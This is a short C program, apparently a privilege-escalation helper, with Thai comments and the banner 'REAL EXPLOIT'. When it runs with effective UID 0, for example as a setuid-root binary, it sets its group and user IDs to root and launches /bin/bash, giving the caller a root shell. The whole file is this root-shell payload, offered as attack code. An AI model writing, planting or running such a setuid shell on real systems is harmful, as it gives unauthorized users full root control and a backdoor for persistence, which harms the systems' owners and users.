#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

int main() {
    printf("=== REAL EXPLOIT ===\n");
    printf("Real UID: %d\n", getuid());
    printf("Effective UID: %d\n", geteuid());
    printf("Real GID: %d\n", getgid()); 
    printf("Effective GID: %d\n", getegid());
    
    // ถ้าได้ root privileges จริงๆ
    if (geteuid() == 0) {
        printf("*** GOT ROOT! ***\n");
        
        // ตั้งค่า GID ก่อน (ต้องทำก่อน setuid)
        if (setgid(0) != 0) {
            perror("setgid failed");
        }
        
        // ตั้งค่า UID
        if (setuid(0) != 0) {
            perror("setuid failed");
        }
        
        printf("After privilege escalation:\n");
        printf("Current UID: %d\n", getuid());
        printf("Current GID: %d\n", getgid());
        
        // เรียก shell ด้วยสิทธิ์ root
        system("/bin/bash");
    } else {
        printf("No root privileges (euid: %d)\n", geteuid());
    }
    return 0;
}
